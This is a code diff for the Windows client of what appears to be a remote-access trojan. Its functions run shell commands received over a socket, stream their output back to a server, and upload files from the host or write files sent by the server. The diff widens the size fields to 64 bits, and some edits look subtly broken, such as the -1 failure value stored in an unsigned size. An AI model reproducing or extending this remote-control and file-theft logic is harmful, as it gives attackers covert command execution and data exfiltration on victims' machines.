@@ -61,11 +61,11 @@ int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET con
 		// Read stdout, stderr bytes from pipe.
 		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);
 
-		int32_t chunk_size = (int32_t)bytes_read;
-		uint32_t chunk_size_nbytes = ntohl(chunk_size); // u_long == uint32_t
-		
+		uint64_t chunk_size = (uint64_t)bytes_read;
+		uint64_t chunk_size_nbytes = htonll(chunk_size); 
+
 		// Send serialized chunk size int32 bytes to server.
-		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint32_t), 0) < 1)
+		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint64_t), 0) < 1)
 			return SOCKET_ERROR;
 
 		// If we've reached the end of the child's stdout, stderr.
@@ -92,15 +92,13 @@ int exec_cmd(const SOCKET connect_socket, char* const buf)
 	saAttr.lpSecurityDescriptor = NULL;
 
 	// Create a pipe for the child process's STDOUT.
-	if (!CreatePipe(&child_stdout_read, &child_stdout_write, &saAttr, 0)) 
-		return FAILURE;
+	if ((!CreatePipe(&child_stdout_read, &child_stdout_write, &saAttr, 0))
 
 	// Ensure the read handle is not inherited.
-	if (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))
-		return FAILURE;
+	|| (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))
 
 	// Execute command via CreateProcess.
-	if (!sakito_win_cp(child_stdout_write, buf))
+	|| (!sakito_win_cp(child_stdout_write, buf)))
 		return FAILURE;
 
 	return send_pipe_output(child_stdout_read, buf, connect_socket);
@@ -128,7 +126,7 @@ int ch_dir(char* const dir, const SOCKET connect_socket)
 int send_file(const SOCKET connect_socket, char* const buf) 
 {
 	// Default f_size value = -1
-	int32_t f_size = FAILURE;
+	uint64_t f_size = FAILURE;
 
 	// Open file with read permissions.
 	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);
@@ -160,11 +158,11 @@ int recv_file(const SOCKET connect_socket, char* const buf)
 		return SOCKET_ERROR;
 
 	// Receive file size.
-	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
+	if (recv(connect_socket, buf, sizeof(uint64_t), 0) < 1)
 		return SOCKET_ERROR;
 
 	// Deserialize f_size.
-	int32_t f_size = ntohl_conv(buf);
+	uint64_t f_size = ntohll_conv(buf);
 
 	// Initialize i_result to true/1.
 	int i_result = SUCCESS;
